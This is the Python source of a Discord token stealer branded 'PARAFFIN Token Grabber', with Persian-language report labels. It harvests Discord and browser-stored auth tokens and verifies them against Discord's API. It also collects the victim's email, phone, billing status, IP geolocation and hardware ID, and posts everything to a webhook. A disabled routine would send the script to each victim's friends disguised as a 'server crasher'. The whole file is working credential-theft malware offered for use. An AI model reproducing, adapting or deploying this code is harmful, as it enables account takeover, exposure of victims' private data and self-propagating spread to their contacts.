import re, os
if os.name != "nt":
	exit()
from re import findall
import json
import platform as plt
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv

webhook_url = ""

languages = {
	'da'    : 'Danish, Denmark',
	'de'    : 'German, Germany',
	'en-GB' : 'English, United Kingdom',
	'en-US' : 'English, United States',
	'es-ES' : 'Spanish, Spain',
	'fr'    : 'French, France',
	'hr'    : 'Croatian, Croatia',
	'lt'    : 'Lithuanian, Lithuania',
	'hu'    : 'Hungarian, Hungary',
	'nl'    : 'Dutch, Netherlands',
	'no'    : 'Norwegian, Norway',
	'pl'    : 'Polish, Poland',
	'pt-BR' : 'Portuguese, Brazilian, Brazil',
	'ro'    : 'Romanian, Romania',
	'fi'    : 'Finnish, Finland',
	'sv-SE' : 'Swedish, Sweden',
	'vi'    : 'Vietnamese, Vietnam',
	'tr'    : 'Turkish, Turkey',
	'cs'    : 'Czech, Czechia, Czech Republic',
	'el'    : 'Greek, Greece',
	'bg'    : 'Bulgarian, Bulgaria',
	'ru'    : 'Russian, Russia',
	'uk'    : 'Ukranian, Ukraine',
	'th'    : 'Thai, Thailand',
	'zh-CN' : 'Chinese, China',
	'ja'    : 'Japanese',
	'zh-TW' : 'Chinese, Taiwan',
	'ko'    : 'Korean, Korea'
}

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
	"Discord"           : ROAMING + "\\Discord",
	"Discord Canary"    : ROAMING + "\\discordcanary",
	"Discord PTB"       : ROAMING + "\\discordptb",
	"Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
	"Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
	"Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
	"Safari"			: LOCAL + "\\Safari\\User Data\\Default",
}
def getheaders(token=None, content_type="application/json"):
	headers = {
		"Content-Type": content_type,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
	}
	if token:
		headers.update({"Authorization": token})
	return headers
def getuserdata(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
	except:
		pass
def gettokens(path):
	path += "\\Local Storage\\leveldb"
	tokens = []
	for file_name in os.listdir(path):
		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
			continue
		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
				for token in findall(regex, line):
					tokens.append(token)
	return tokens
def getdeveloper():
	dev = "2021 - by Parsa"
	try:
		dev = urlopen(Request("https://pastebin.com/raw/qa1ftnHs")).read().decode()
	except:
		pass
	return dev
def getip():
	ip = org = loc = city = country = region = googlemap = "None"
	try:
		url = 'http://ipinfo.io/json'
		response = urlopen(url)
		data = json.load(response)
		ip = data['ip']
		org = data['org']
		loc = data['loc']
		postal = data['postal']
		city = data['city']
		country = data['country']
		region = data['region']
		googlemap = "https://www.google.com/maps/search/google+map++" + loc
	except:
		pass
	return ip,org,loc,city,country,region,googlemap
def getavatar(uid, aid):
	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
	try:
		urlopen(Request(url))
	except:
		url = url[:-4]
	return url
def gethwid():
	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
	return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getfriends(token):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
	except:
		pass
def getchat(token, uid):
	try:
		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
	except:
		pass
def has_payment_methods(token):
	try:
		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
	except:
		pass
def send_message(token, chat_id, form_data):
	try:
		urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
	except:
		pass
def spread(token, form_data, delay):
	return # Remove to re-enabled
	for friend in getfriends(token):
		try:
			chat_id = getchat(token, friend["id"])
			send_message(token, chat_id, form_data)
		except Exception as e:
			pass
		sleep(delay)
def main():
	global webhook_url
	cache_path = ROAMING + "\\.cache~$"
	prevent_spam = True
	self_spread = True
	embeds = []
	working = []
	checked = []
	already_cached_tokens = []
	working_ids = []
	computer_os = plt.platform()
	ip,org,loc,city,country,region,googlemap = getip()
	pc_username = os.getenv("UserName")
	pc_name = os.getenv("COMPUTERNAME")
	user_path_name = os.getenv("userprofile").split("\\")[2]
	developer = getdeveloper()
	for platform, path in PATHS.items():
		if not os.path.exists(path):
			continue
		for token in gettokens(path):
			if token in checked:
				continue
			checked.append(token)
			uid = None
			if not token.startswith("mfa."):
				try:
					uid = b64decode(token.split(".")[0].encode()).decode()
				except:
					pass
				if not uid or uid in working_ids:
					continue
			user_data = getuserdata(token)
			if not user_data:
				continue
			working_ids.append(uid)
			working.append(token)
			username = user_data["username"] + "#" + str(user_data["discriminator"])
			user_id = user_data["id"]
			locale = user_data['locale']
			avatar_id = user_data["avatar"]
			avatar_url = getavatar(user_id, avatar_id)
			email = user_data.get("email")
			phone = user_data.get("phone")
			verified = user_data['verified']
			mfa_enabled = user_data['mfa_enabled']
			flags = user_data['flags']

			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')

			language = languages.get(locale)
			nitro = bool(user_data.get("premium_type"))
			billing = bool(has_payment_methods(token))
			embed = {
				"color": 0xFFD400,
				"fields": [
					{
						"name": "**اطلاعات اکانت 👤**",
						"value": f'> **ایمیل** : {email}\n> **شماره** : I {phone}\n> **نیترو** : {nitro}\n> **صورت حساب خرید** : {billing}\n> **بدج های اکانت** : I {flags}',
						"inline": True
					},
					{
						"name": "‍‍**اطلاعات کامپیوتر 💻**",
						"value": f'> **مدل کامپیوتر** : {computer_os}\n> **نام کامپیوتر** : {pc_username}\n > **نام دسکتاپ** : {pc_name}\n> **پلتفرم توکن** : {platform}',
						"inline": True
					},
					{
						"name": "--------------------------------------------------------------------------------------------------",
						"value":"**--------------------------------------------------------------------------------------------------**",
						"inline": False
					},
					{
						"name": "**اطلاعات آی پی** 🌐",
						"value": f'> **آی پی** : I {ip}\n> **نقشه روی گوگل مپ** : I [{loc}]({googlemap})\n> **شهر** : {city}\n> **کشور** : {region}',
						"inline": True
					},
					{
						"name": "**اطلاعات تکمیلی** :ballot_box_with_check: ",
						"value": f'> **زبان** : {locale} ({language})\n> **تاییدیه ایمیل** : {verified}\n> **تو فکتوری** : {mfa_enabled}\n> **تاریخ ساخت اکانت** : I {creation_date}',
						"inline": True
					},
					
				],
				"author": {
					"name": f"{username} ({user_id})",
					"icon_url": avatar_url
				},
				"footer": {
					"text": f"PARAFFIN Info Grabber",
					"icon_url": "https://cdn.discordapp.com/attachments/776425421968244768/798803071659409418/paraffinredc.png"
				}
			}
			embed2 = {
				"color": 0xff0000,
				"fields": [
					
					{
						"name": "**توکن** 📟",
						"value": token,
						"inline": False
					}
				],
				"author": {
					"name": f"{username} ({user_id})",
					"icon_url": avatar_url
				},
				"footer": {
					"text": f"PARAFFIN Token Grabber",
					"icon_url": "https://cdn.discordapp.com/attachments/776425421968244768/798803071659409418/paraffinredc.png"
				}
			}
			embed3 = {
				"color": 0x1BA41A,
				"fields": [
					
					{
						"name": "> **اولین و برترین توکن گربر دیسکورد فارسی**",
						"value": f'> کاملا حرفه ای و تست شده روی تمام پلتفرم ها \n> **دارای تمام اطلاعات اکانت و کامپیوتر طعمه**\n> Web : [Paraffin.SITE](https://paraffin.site)\n> YT : [youtube/paraffin](https://www.youtube.com/watch?v=stIqHgKHZVY&t=19s)',
						"inline": True
					},
					
				],
				"author": {
					"name": f"PARAFFIN ™",
					"icon_url": "https://cdn.discordapp.com/attachments/776425421968244768/798803071659409418/paraffinredc.png"
				},
				"footer": {
					"text": f"PARAFFIN TEAM",
					"icon_url": "https://cdn.discordapp.com/attachments/776425421968244768/798803071659409418/paraffinredc.png"
				}
			}
			embeds.append(embed)
			embeds.append(embed2)
			embeds.append(embed3)
	with open(cache_path, "a") as file:
		for token in checked:
			if not token in already_cached_tokens:
				file.write(token + "\n")
	if len(working) == 0:
		working.append('123')
	webhook = {
		"content": "",
		"embeds": embeds,
		"username": username,
		"avatar_url": avatar_url
	}
	try:
		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
	except:
		pass
	if self_spread:
		for token in working:
			with open(argv[0], encoding="utf-8") as file:
				content = file.read()
			payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
			Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
	main()
except Exception as e:
	print(e)
	pass
